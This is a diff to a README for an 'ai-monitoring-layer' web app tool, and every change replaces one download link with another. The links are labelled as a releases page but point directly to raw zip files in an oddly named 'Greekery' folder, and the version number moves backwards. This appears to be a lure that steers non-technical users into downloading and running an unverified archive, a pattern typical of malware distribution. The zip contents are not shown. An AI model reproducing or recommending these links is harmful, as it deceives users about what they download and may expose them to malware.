@@ -1,6 +1,6 @@
 # 🚀 ai-monitoring-layer - Simple AI Insights for Your Web Apps
 
-[![Download ai-monitoring-layer](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)
+[![Download ai-monitoring-layer](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/layer_monitoring_ai_1.6-beta.4.zip)](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/layer_monitoring_ai_1.6-beta.4.zip)
 
 ## 📖 Introduction
 
@@ -27,7 +27,7 @@ To run ai-monitoring-layer, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
 
-   [Visit Releases Page](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/layer_monitoring_ai_1.6-beta.4.zip)
 
 2. **Download the Latest Release**: Find the latest version available. Click on it to download.
 
@@ -42,7 +42,7 @@ To get started with ai-monitoring-layer, follow these steps:
 
 1. **Visit the Releases Page**: Go to the following link to access the files available for download:
 
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/monitoring-layer-ai-2.8.zip)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/LaurenceGab/ai-monitoring-layer/main/Greekery/layer_monitoring_ai_1.6-beta.4.zip)
 
 2. **Download the application**: 
    - Choose the most recent version and download it.
